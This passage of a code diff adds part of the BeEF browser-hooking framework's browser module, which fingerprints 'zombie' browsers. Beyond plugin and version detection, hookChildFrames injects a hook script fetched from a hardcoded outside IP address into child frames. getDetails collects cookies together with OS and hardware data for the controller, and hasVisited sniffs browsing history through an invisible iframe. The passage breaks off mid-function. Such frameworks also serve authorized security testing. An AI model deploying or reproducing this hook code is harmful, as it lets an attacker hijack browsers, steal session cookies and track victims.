+        ;   // Firefox 43
+        if (this.isFF44()) {
+            return '44'
+        }
+        ;   // Firefox 44
+        if (this.isFF45()) {
+            return '45'
+        }
+        ;   // Firefox 45
+        if (this.isFF46()) {
+            return '46'
+        }
+        ;   // Firefox 46
+        if (this.isFF47()) {
+            return '47'
+        }
+        ;   // Firefox 47
+        if (this.isFF48()) {
+            return '48'
+        }
+        ;   // Firefox 48
+        if (this.isFF49()) {
+            return '49'
+        }
+        ;   // Firefox 49
+        if (this.isFF50()) {
+            return '50'
+        }
+        ;   // Firefox 50
+        if (this.isFF51()) {
+            return '51'
+        }
+        ;   // Firefox 51
+        if (this.isFF52()) {
+            return '52'
+        }
+        ;   // Firefox 52
+        if (this.isFF53()) {
+            return '53'
+        }
+        ;   // Firefox 53
+        if (this.isFF54()) {
+            return '54'
+        }
+        ;   // Firefox 54
+        if (this.isFF55()) {
+            return '55'
+        }
+        ;   // Firefox 55
+        if (this.isFF56()) {
+            return '56'
+        }
+        ;   // Firefox 56
+        if (this.isFF57()) {
+            return '57'
+        }
+        ;   // Firefox 57
+        if (this.isFF58()) {
+            return '58'
+        }
+        ;   // Firefox 58
+        if (this.isFF59()) {
+            return '59'
+        }
+        ;   // Firefox 59
+        if (this.isFF60()) {
+            return '60'
+        }
+        ;   // Firefox 60
+        if (this.isFF61()) {
+            return '61'
+        }
+        ;   // Firefox 61
+        if (this.isFF62()) {
+            return '62'
+        }
+        ;   // Firefox 62
+        if (this.isFF63()) {
+            return '63'
+        }
+        ;   // Firefox 63
+        if (this.isFF64()) {
+            return '64'
+        }
+        ;   // Firefox 64
+        if (this.isFF65()) {
+            return '65'
+        }
+        ;   // Firefox 65
+        if (this.isFF66()) {
+            return '66'
+        }
+        ;   // Firefox 66
+        if (this.isFF67()) {
+            return '67'
+        }
+        ;   // Firefox 67
+        if (this.isFF68()) {
+            return '68'
+        }
+        ;   // Firefox 68
+        if (this.isFF69()) {
+            return '69'
+        }
+        ;   // Firefox 69
+        if (this.isFF70()) {
+            return '70'
+        }
+        ;   // Firefox 70
+        if (this.isFF71()) {
+            return '71'
+        }
+        ;   // Firefox 71
+        if (this.isFF72()) {
+            return '72'
+        }
+        ;   // Firefox 72
+        if (this.isFF73()) {
+            return '73'
+        }
+        ;   // Firefox 73
+        if (this.isFF74()) {
+            return '74'
+        }
+        ;   // Firefox 74
+        if (this.isFF75()) {
+            return '75'
+        }
+        ;   // Firefox 75
+        if (this.isFF76()) {
+            return '76'
+        }
+        ;   // Firefox 76
+        if (this.isFF77()) {
+            return '77'
+        }
+        ;   // Firefox 77
+        if (this.isFF78()) {
+            return '78'
+        }
+        ;   // Firefox 78
+        if (this.isFF79()) {
+            return '79'
+        }
+        ;   // Firefox 79
+        if (this.isFF80()) {
+            return '80'
+        }
+        ;   // Firefox 80
+        if (this.isFF81()) {
+            return '81'
+        }
+        ;   // Firefox 81
+        if (this.isFF82()) {
+            return '82'
+        }
+        ;   // Firefox 82
+        if (this.isFF83()) {
+            return '83'
+        }
+        ;   // Firefox 83
+        if (this.isFF84()) {
+            return '84'
+        }
+        ;   // Firefox 84
+        if (this.isFF85()) {
+            return '85'
+        }
+        ;   // Firefox 85
+        if (this.isFF86()) {
+            return '86'
+        }
+        ;   // Firefox 86
+        if (this.isFF87()) {
+            return '87'
+        }
+        ;   // Firefox 87
+        if (this.isFF88()) {
+            return '88'
+        }
+        ;   // Firefox 88
+        if (this.isFF89()) {
+            return '89'
+        }
+        ;   // Firefox 89
+        if (this.isFF90()) {
+            return '90'
+        }
+        ;   // Firefox 90
+        if (this.isFF91()) {
+            return '91'
+        }
+        ;   // Firefox 91
+        if (this.isFF92()) {
+            return '92'
+        }
+        ;   // Firefox 92
+        if (this.isFF93()) {
+            return '93'
+        }
+        ;   // Firefox 93
+        if (this.isFF94()) {
+            return '94'
+        }
+        ;   // Firefox 94
+        if (this.isFF95()) {
+            return '95'
+        }
+        ;   // Firefox 95
+        if (this.isFF96()) {
+            return '96'
+        }
+        ;   // Firefox 96
+        if (this.isFF97()) {
+            return '97'
+        }
+        ;   // Firefox 97
+        if (this.isFF98()) {
+            return '98'
+        }
+        ;   // Firefox 98
+        if (this.isFF99()) {
+            return '99'
+        }
+        ;   // Firefox 99
+
+        if (this.isIE6()) {
+            return '6'
+        }
+        ;	// Internet Explorer 6
+        if (this.isIE7()) {
+            return '7'
+        }
+        ;	// Internet Explorer 7
+        if (this.isIE8()) {
+            return '8'
+        }
+        ;	// Internet Explorer 8
+        if (this.isIE9()) {
+            return '9'
+        }
+        ;	// Internet Explorer 9
+        if (this.isIE10()) {
+            return '10'
+        }
+        ;	// Internet Explorer 10
+        if (this.isIE11()) {
+            return '11'
+        }
+        ;   // Internet Explorer 11
+
+        if (this.isEdge()) {
+            return '1'
+        }
+        ;   // Microsoft Edge
+
+        if (this.isEpi()) {
+            // believe the UserAgent string for version info - until whenever
+            var epiphanyRe = /Epiphany\/(\d+)/;
+            var versionDetails = epiphanyRe.exec( beef.browser.getBrowserReportedName());
+            if (versionDetails.length > 1) {
+                return versionDetails[1];
+            } else {
+                return "UNKNOWN"; // returns from here or it may take Safari version details
+            }
+        }
+        ;                       // Epiphany
+
+        if (this.isS4()) {
+            return '4'
+        }
+        ;	// Safari 4
+        if (this.isS5()) {
+            return '5'
+        }
+        ;	// Safari 5
+        if (this.isS6()) {
+            return '6'
+        }
+        ;	// Safari 6
+
+        if (this.isS7()) {
+            return '7'
+        }
+        ;	// Safari 7
+        if (this.isS8()) {
+            return '8'
+        }
+        ;       // Safari 8
+
+        if (this.isO9_52()) {
+            return '9.5'
+        }
+        ;	// Opera 9.5x
+        if (this.isO9_60()) {
+            return '9.6'
+        }
+        ;	// Opera 9.6
+        if (this.isO10()) {
+            return '10'
+        }
+        ;	// Opera 10.xx
+        if (this.isO11()) {
+            return '11'
+        }
+        ;	// Opera 11.xx
+        if (this.isO12()) {
+            return '12'
+        }
+        ;	// Opera 12.xx
+
+        // platform.js
+        try {
+          var version = platform.version;
+          if (!!version)
+            return version;
+        } catch (e) {}
+
+        return 'UNKNOWN';				// Unknown UA
+    },
+
+    /**
+     * Returns the type of user agent by hooked browser.
+     * @return: {String} User agent software.
+     *
+     * @example: beef.browser.getBrowserName()
+     */
+    getBrowserName: function () {
+        if (this.isEdge()) {
+            return 'E'
+        }
+        ;       // Microsoft Edge any version
+        if (this.isC()) {
+            return 'C'
+        }
+        ;   // Chrome any version
+        if (this.isFF()) {
+            return 'FF'
+        }
+        ;		// Firefox any version
+        if (this.isIE()) {
+            return 'IE'
+        }
+        ;		// Internet Explorer any version
+        if (this.isO()) {
+            return 'O'
+        }
+        ;		// Opera any version
+        if (this.isEpi()) {
+            return 'EP'
+        }
+        ;			// Epiphany any version
+        if (this.isS()) {
+            return 'S'
+        }
+        ;		// Safari any version
+        if (this.isA()) {
+            return 'A'
+        }
+        ;               // Avant any version
+        if (this.isMidori()) {
+            return 'MI'
+        }
+        ;               // Midori any version
+        if (this.isOdyssey()) {
+            return 'OD'
+        }
+        ;               // Odyssey any version
+        if (this.isBrave()) {
+            return 'BR'
+        }
+        ;               // Brave any version
+        return 'UNKNOWN';	// Unknown UA
+    },
+
+    /**
+     * Hooks all child frames in the current window
+     * Restricted by same-origin policy
+     */
+    hookChildFrames: function () {
+
+        // create script object
+        var script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = 'http://13.51.193.62:3000/hook.js';
+
+        // loop through child frames
+        for (var i = 0; i < self.frames.length; i++) {
+            try {
+                // append hook script
+                self.frames[i].document.body.appendChild(script);
+                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
+            } catch (e) {
+                // warn on cross-origin
+                beef.debug("Hooking child frame failed: " + e.message);
+            }
+        }
+    },
+
+    /**
+     * Checks if the zombie has flash installed and enabled.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasFlash()) { ... }
+     */
+    hasFlash: function () {
+      if (!beef.browser.isIE()) {
+        return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
+      }
+
+      if (!!navigator.plugins) {
+        return (navigator.plugins["Shockwave Flash"] != undefined);
+      }
+
+      // IE
+      var flash_versions = 12;
+      if (window.ActiveXObject != null) {
+        for (x = 2; x <= flash_versions; x++) {
+          try {
+            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
+            if (Flash) {
+              return true;
+            }
+          } catch (e) {
+            beef.debug("Creating Flash ActiveX object failed: " + e.message);
+          }
+        }
+      }
+
+      return false;
+    },
+
+    /**
+     * Checks if the zombie has the QuickTime plugin installed.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if ( beef.browser.hasQuickTime() ) { ... }
+     */
+    hasQuickTime: function () {
+        if (!!navigator.plugins) {
+            for (i = 0; i < navigator.plugins.length; i++) {
+                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
+                    return true;
+                }
+            }
+        }
+
+        // IE
+        try {
+          var qt_test = new ActiveXObject('QuickTime.QuickTime');
+          if (qt_test) {
+            return true;
+          }
+        } catch (e) {
+          beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
+        }
+
+        return false;
+    },
+
+    /**
+     * Checks if the zombie has the RealPlayer plugin installed.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
+     */
+    hasRealPlayer: function () {
+
+        if (!!navigator.plugins) {
+          for (i = 0; i < navigator.plugins.length; i++) {
+            if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
+              return true;
+            }
+          }
+        }
+
+        // IE
+        var definedControls = [
+          'RealPlayer',
+          'rmocx.RealPlayer G2 Control',
+          'rmocx.RealPlayer G2 Control.1',
+          'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
+          'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
+        ];
+
+        for (var i = 0; i < definedControls.length; i++) {
+          try {
+            var rp_test = new ActiveXObject(definedControls[i]);
+            if (rp_test) {
+              return true;
+            }
+          } catch (e) {
+            beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
+          }
+        }
+
+        return false;
+    },
+
+    /**
+     * Checks if the zombie has the Windows Media Player plugin installed.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if ( beef.browser.hasWMP() ) { ... }
+     */
+    hasWMP: function () {
+      if (!!navigator.plugins) {
+        for (i = 0; i < navigator.plugins.length; i++) {
+          if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
+            return true;
+          }
+        }
+      }
+
+      // IE
+      try {
+        var wmp_test = new ActiveXObject('WMPlayer.OCX');
+        if (wmp_test) {
+          return true;
+        }
+      } catch (e) {
+        beef.debug("Creating WMP ActiveX object failed: " + e.message);
+      }
+
+      return false;
+    },
+
+    /**
+     *  Checks if VLC is installed
+     *  @return: {Boolean} true or false
+     **/
+    hasVLC: function () {
+      if (beef.browser.isIE() || beef.browser.isEdge()) {
+        try {
+          control = new ActiveXObject("VideoLAN.VLCPlugin.2");
+          return true;
+        } catch (e) {
+          beef.debug("Creating VLC ActiveX object failed: " + e.message);
+        }
+      } else {
+        for (i = 0; i < navigator.plugins.length; i++) {
+          if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
+            return true;
+          }
+        }
+      }
+      return false;
+    },
+
+    /**
+     * Checks if the zombie has Java enabled.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.javaEnabled()) { ... }
+     */
+    javaEnabled: function () {
+      return navigator.javaEnabled();
+    },
+
+    /**
+     * Checks if the Phonegap API is available from the hooked origin.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasPhonegap()) { ... }
+     */
+    hasPhonegap: function () {
+        var result = false;
+
+        try {
+            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
+        }
+        catch (e) {
+            result = false;
+        }
+        return result;
+    },
+
+    /**
+     * Checks if the browser supports CORS
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasCors()) { ... }
+     */
+    hasCors: function () {
+        if ('withCredentials' in new XMLHttpRequest())
+            return true;
+        else if (typeof XDomainRequest !== "undefined")
+            return true;
+        else
+            return false;
+    },
+
+    /**
+     * Checks if the zombie has Java installed and enabled.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasJava()) { ... }
+     */
+    hasJava: function () {
+        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
+          return true;
+        } else {
+          return false;
+        }
+    },
+
+    /**
+     * Checks if the zombie has VBScript enabled.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasVBScript()) { ... }
+     */
+    hasVBScript: function () {
+        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
+            return true;
+        } else {
+            return false;
+        }
+    },
+
+    /**
+     * Returns the list of plugins installed in the browser.
+     */
+    getPlugins: function () {
+
+        var results;
+
+        function unique(array) {
+          return $j.grep(array, function(el, index) {
+            return index === $j.inArray(el, array);
+          });
+        }
+
+        // Things lacking navigator.plugins
+        if (!navigator.plugins) 
+          return this.getPluginsIE();
+
+        // All other browsers that support navigator.plugins
+        if (navigator.plugins && navigator.plugins.length > 0) {
+            results = new Array();
+            for (var i = 0; i < navigator.plugins.length; i++) {
+
+                // Firefox returns exact plugin versions
+                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;
+
+                // Webkit and Presto (Opera)
+                // Don't support the version attribute
+                // Sometimes store the version in description (Real, Adobe)
+                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
+            }
+            results = unique(results).toString();
+            
+            // All browsers that don't support navigator.plugins
+        } else {
+            results = new Array();
+            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
+            // On linux sistem the "version" slot is empty so I'll attach "description" after version
+            var plugins = {
+
+                'AdobeAcrobat': {
+                    'control': 'Adobe Acrobat',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["Adobe Acrobat"]["description"];
+                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;
+
+                        }
+                        catch (e) {
+                        }
+
+
+                    }},
+                'Flash': {
+                    'control': 'Shockwave Flash',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["Shockwave Flash"]["description"];
+                            return 'Flash Player Version ' + version; //+ " description "+ filename;
+                        }
+
+                        catch (e) {
+                        }
+                    }},
+                'Google_Talk_Plugin_Accelerator': {
+                    'control': 'Google Talk Plugin Video Accelerator',
+                    'return': function (control) {
+
+                        try {
+                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
+                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'Google_Talk_Plugin': {
+                    'control': 'Google Talk Plugin',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins['Google Talk Plugin']["description"];
+                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'Facebook_Video_Calling_Plugin': {
+                    'control': 'Facebook Video Calling Plugin',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
+                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'Google_Update': {
+                    'control': 'Google Update',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["Google Update"]["description"];
+                            return 'Google Update Version ' + version//+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'Windows_Activation_Technologies': {
+                    'control': 'Windows Activation Technologies',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["Windows Activation Technologies"]["description"];
+                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+
+                    }},
+                'VLC_Web_Plugin': {
+                    'control': 'VLC Web Plugin',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins["VLC Web Plugin"]["description"];
+                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'Google_Earth_Plugin': {
+                    'control': 'Google Earth Plugin',
+
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins['Google Earth Plugin']["description"];
+                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
+                        }
+                        catch (e) {
+                        }
+                    }},
+                'FoxitReader_Plugin': {
+                    'control': 'FoxitReader Plugin',
+                    'return': function (control) {
+                        try {
+                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
+                            return 'FoxitReader Plugin Version ' + version;
+                        } catch (e) {
+                        }
+                    }}
+            };
+
+            var c = 0;
+            for (var i in plugins) {
+                //each element od plugins
+                var control = plugins[i]['control'];
+                try {
+                    var version = plugins[i]['return'](control);
+                    if (version) {
+                        results[c] = version;
+                        c = c + 1;
+                    }
+                }
+                catch (e) {
+                }
+
+            }
+        }
+        // Return results
+        return results;
+    },
+
+    /**
+     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
+     * support navigator.plugins
+     */
+    getPluginsIE: function () {
+        var results = '';
+        var plugins = {
+            'AdobePDF6': {
+                'control': 'PDF.PdfCtrl',
+            'return': function (control) {
+                version = control.getVersions().split(',');
+                version = version[0].split('=');
+                return 'Acrobat Reader v' + parseFloat(version[1]);
+            }},
+            'AdobePDF7': {
+                'control': 'AcroPDF.PDF',
+                'return': function (control) {
+                    version = control.getVersions().split(',');
+                    version = version[0].split('=');
+                    return 'Acrobat Reader v' + parseFloat(version[1]);
+                }},
+            'Flash': {
+                'control': 'ShockwaveFlash.ShockwaveFlash',
+                'return': function (control) {
+                    version = control.getVariable('$version').substring(4);
+                    return 'Flash Player v' + version.replace(/,/g, ".");
+                }},
+            'Quicktime': {
+                'control': 'QuickTime.QuickTime',
+                'return': function (control) {
+                    return 'QuickTime Player';
+                }},
+            'RealPlayer': {
+                'control': 'RealPlayer',
+                'return': function (control) {
+                    version = control.getVersionInfo();
+                    return 'RealPlayer v' + parseFloat(version);
+                }},
+            'Shockwave': {
+                'control': 'SWCtl.SWCtl',
+                'return': function (control) {
+                    version = control.ShockwaveVersion('').split('r');
+                    return 'Shockwave v' + parseFloat(version[0]);
+                }},
+            'WindowsMediaPlayer': {
+                'control': 'WMPlayer.OCX',
+                'return': function (control) {
+                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
+                }},
+            'FoxitReaderPlugin': {
+                'control': 'FoxitReader.FoxitReaderCtl.1',
+                'return': function (control) {
+                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
+                }}
+        };
+        if (window.ActiveXObject) {
+            var j = 0;
+            for (var i in plugins) {
+                var control = null;
+                var version = null;
+                try {
+                    control = new ActiveXObject(plugins[i]['control']);
+                } catch (e) {
+                }
+                if (control) {
+                    if (j != 0)
+                        results += ', ';
+                    results += plugins[i]['return'](control);
+                    j++;
+                }
+            }
+        }
+        return results;
+    },
+
+    /**
+     * Returns zombie browser window size.
+     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
+     */
+    getWindowSize: function () {
+        var myWidth = 0, myHeight = 0;
+        if (typeof( window.innerWidth ) == 'number') {
+            // Non-IE
+            myWidth = window.innerWidth;
+            myHeight = window.innerHeight;
+        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
+            // IE 6+ in 'standards compliant mode'
+            myWidth = document.documentElement.clientWidth;
+            myHeight = document.documentElement.clientHeight;
+        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
+            // IE 4 compatible
+            myWidth = document.body.clientWidth;
+            myHeight = document.body.clientHeight;
+        }
+        return {
+            width: myWidth,
+            height: myHeight
+        }
+    },
+
+    /**
+     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
+     */
+    getDetails: function () {
+        var details = new Array();
+
+        var browser_name = beef.browser.getBrowserName();
+        var browser_version = beef.browser.getBrowserVersion();
+        var browser_engine = beef.browser.getBrowserEngine();
+        var browser_reported_name = beef.browser.getBrowserReportedName();
+        var browser_language = beef.browser.getBrowserLanguage();
+        var page_title = (document.title) ? document.title : "Unknown";
+        var origin = (window.origin) ? window.origin : "Unknown";
+        var page_uri = (document.location.href) ? document.location.href : "Unknown";
+        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
+        var page_hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var default_port = "";
+        switch (document.location.protocol) {
+        case "http:":
+            var default_port = "80";
+            break;
+        case "https:":
+            var default_port = "443";
+            break;
+        }
+        var page_hostport = (document.location.port) ? document.location.port : default_port;
+        var browser_plugins = beef.browser.getPlugins();
+        var date_stamp = new Date().toString();
+        var os_name = beef.os.getName();
+        var os_family = beef.os.getFamily();
+        var os_version = beef.os.getVersion();
+        var os_arch = beef.os.getArch();
+        var default_browser = beef.os.getDefaultBrowser();
+        var hw_type = beef.hardware.getName();
+        var battery_details = beef.hardware.getBatteryDetails();
+        try {
+          var battery_charging_status = battery_details.chargingStatus;
+          var battery_level = battery_details.batteryLevel;
+          var battery_charging_time = battery_details.chargingTime;
+          var battery_discharging_time = battery_details.dischargingTime;
+        } catch(e) {}
+        var memory = beef.hardware.getMemory();
+        var cpu_arch = beef.hardware.getCpuArch();
+        var cpu_cores = beef.hardware.getCpuCores();
+        var gpu_details = beef.hardware.getGpuDetails();
+        try {
+          var gpu = gpu_details.gpu;
+          var gpu_vendor = gpu_details.vendor;
+        } catch(e) {}
+        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
+        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
+        var screen_size = beef.hardware.getScreenSize();
+        try {
+          var screen_width = screen_size.width;
+          var screen_height = screen_size.height;
+          var screen_colordepth = screen_size.colordepth;
+        } catch(e) {}
+        var window_size = beef.browser.getWindowSize();
+        try {
+          window_width = window_size.width;
+          window_height = window_size.height;
+        } catch(e) {}
+        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
+        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
+        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
+        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
+        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
+        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
+        var has_web_worker = (beef.browser.hasWebWorker()) ? "Yes" : "No";
+        var has_web_gl = (beef.browser.hasWebGL()) ? "Yes" : "No";
+        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
+        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
+        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
+        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
+        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
+        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";
+
+        try {
+            var cookies = document.cookie;
+            if (cookies) details['browser.window.cookies'] = cookies;
+        } catch (e) {
+            beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
+            details['browser.window.cookies'] = '';
+        }
+
+        if (browser_name) details['browser.name'] = browser_name;
+        if (browser_version) details['browser.version'] = browser_version;
+        if (browser_engine) details['browser.engine'] = browser_engine;
+        if (browser_reported_name) details['browser.name.reported'] = browser_reported_name;
+        if (browser_platform) details['browser.platform'] = browser_platform;
+        if (browser_language) details['browser.language'] = browser_language;
+        if (browser_plugins) details['browser.plugins'] = browser_plugins;
+
+        if (page_title) details['browser.window.title'] = page_title;
+        if (origin) details['browser.window.origin'] = origin;
+        if (page_hostname) details['browser.window.hostname'] = page_hostname;
+        if (page_hostport) details['browser.window.hostport'] = page_hostport;
+        if (page_uri) details['browser.window.uri'] = page_uri;
+        if (page_referrer) details['browser.window.referrer'] = page_referrer;
+        if (window_width) details['browser.window.size.width'] = window_width;
+        if (window_height) details['browser.window.size.height'] = window_height;
+        if (date_stamp) details['browser.date.datestamp'] = date_stamp;
+
+        if (os_name) details['host.os.name'] = os_name;
+        if (os_family) details['host.os.family'] = os_family;
+        if (os_version) details['host.os.version'] = os_version;
+        if (os_arch) details['host.os.arch'] = os_arch;
+
+        if (default_browser) details['host.software.defaultbrowser'] = default_browser;
+
+        if (hw_type) details['hardware.type'] = hw_type;
+        if (memory) details['hardware.memory'] = memory;
+        if (gpu) details['hardware.gpu'] = gpu;
+        if (gpu_vendor) details['hardware.gpu.vendor'] = gpu_vendor;
+        if (cpu_arch) details['hardware.cpu.arch'] = cpu_arch;
+        if (cpu_cores) details['hardware.cpu.cores'] = cpu_cores;
+
+        if (battery_charging_status) details['hardware.battery.chargingstatus'] = battery_charging_status;
+        if (battery_level) details['hardware.battery.level'] = battery_level;
+        if (battery_charging_time) details['hardware.battery.chargingtime'] = battery_charging_time;
+        if (battery_discharging_time) details['hardware.battery.dischargingtime'] = battery_discharging_time;
+
+        if (screen_width) details['hardware.screen.size.width'] = screen_width;
+        if (screen_height) details['hardware.screen.size.height'] = screen_height;
+        if (screen_colordepth) details['hardware.screen.colordepth'] = screen_colordepth;
+        if (touch_enabled) details['hardware.screen.touchenabled'] = touch_enabled;
+
+        if (vbscript_enabled) details['browser.capabilities.vbscript'] = vbscript_enabled;
+        if (has_flash) details['browser.capabilities.flash'] = has_flash;
+        if (has_silverlight) details['browser.capabilities.silverlight'] = has_silverlight;
+        if (has_phonegap) details['browser.capabilities.phonegap'] = has_phonegap;
+        if (has_web_socket) details['browser.capabilities.websocket'] = has_web_socket;
+        if (has_webrtc) details['browser.capabilities.webrtc'] = has_webrtc;
+        if (has_web_worker) details['browser.capabilities.webworker'] = has_web_worker;
+        if (has_web_gl) details['browser.capabilities.webgl'] = has_web_gl;
+        if (has_googlegears) details['browser.capabilities.googlegears'] = has_googlegears;
+        if (has_activex) details['browser.capabilities.activex'] = has_activex;
+        if (has_quicktime) details['browser.capabilities.quicktime'] = has_quicktime;
+        if (has_realplayer) details['browser.capabilities.realplayer'] = has_realplayer;
+        if (has_wmp) details['browser.capabilities.wmp'] = has_wmp;
+        if (has_vlc) details['browser.capabilities.vlc'] = has_vlc;
+
+        return details;
+    },
+
+    /**
+     * Returns boolean value depending on whether the browser supports ActiveX
+     */
+    hasActiveX: function () {
+        return !!window.ActiveXObject;
+    },
+
+    /**
+     * Returns boolean value depending on whether the browser supports WebRTC
+     */
+    hasWebRTC: function () {
+        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
+    },
+
+    /**
+     * Returns boolean value depending on whether the browser supports Silverlight
+     */
+    hasSilverlight: function () {
+        var result = false;
+
+        try {
+            if (beef.browser.hasActiveX()) {
+                var slControl = new ActiveXObject('AgControl.AgControl');
+                result = true;
+            } else if (navigator.plugins["Silverlight Plug-In"]) {
+                result = true;
+            }
+        } catch (e) {
+            result = false;
+        }
+
+        return result;
+    },
+
+    /**
+     * Returns array of results, whether or not the target zombie has visited the specified URL
+     */
+    hasVisited: function (urls) {
+        var results = new Array();
+        var iframe = beef.dom.createInvisibleIframe();
+        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
+        ifdoc.open();
+        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
+        ifdoc.close();
+        urls = urls.split("\n");
+        var count = 0;
+        for (var i in urls) {
+            var u = urls[i];
+            if (u != "" || u != null) {
+                var success = false;
+                var a = ifdoc.createElement('a');
+                a.href = u;
+                ifdoc.body.appendChild(a);
+                var width = null;
+                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
+                if (width == '0px') {
+                    success = true;
+                }
+                results.push({'url': u, 'visited': success});
+                count++;
+            }
+        }
+        beef.dom.removeElement(iframe);
+        if (results.length == 0) {
+            return false;
+        }
+        return results;
+    },
+
+    /**
+     * Checks if the zombie has Web Sockets enabled.
+     * @return: {Boolean} true or false.
+     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
+     * */
+    hasWebSocket: function () {
+        return !!window.WebSocket || !!window.MozWebSocket;
+    },
+
+    /**
+     * Checks if the zombie has Web Workers enabled.
+     * @return: {Boolean} true or false.
+     * */
+    hasWebWorker: function () {
+        return (typeof(Worker) !== "undefined");
+    },
+
+    /**
+     * Checks if the zombie has WebGL enabled.
+     * @return: {Boolean} true or false.
+     *
+     * @from: https://github.com/idofilin/webgl-by-example/blob/master/detect-webgl/detect-webgl.js
+     * */
+    hasWebGL: function () {
+        try {
+            var canvas = document.createElement("canvas");
+            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            return !!(gl && gl instanceof WebGLRenderingContext);
+        } catch(e) {
+            return false;
+        }
+    },
+
+    /**
+     * Checks if the zombie has Google Gears installed.
+     * @return: {Boolean} true or false.
+     *
+     * @from: https://code.google.com/apis/gears/gears_init.js
+     * */
+    hasGoogleGears: function () {
+
+        var ggfactory = null;
+
+        // Chrome
+        if (window.google && google.gears) return true;
+
+        // Firefox
+        if (typeof GearsFactory != 'undefined') {
+            ggfactory = new GearsFactory();
+        } else {
+            // IE
+            try {
+                ggfactory = new ActiveXObject('Gears.Factory');
+                // IE Mobile on WinCE.
+                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
+                    ggfactory.privateSetGlobalObject(this);
+                }
+            } catch (e) {
+                // Safari
+                if ((typeof navigator.mimeTypes != 'undefined')
+                    && navigator.mimeTypes["application/x-googlegears"]) {
+                    ggfactory = document.createElement("object");
+                    ggfactory.style.display = "none";
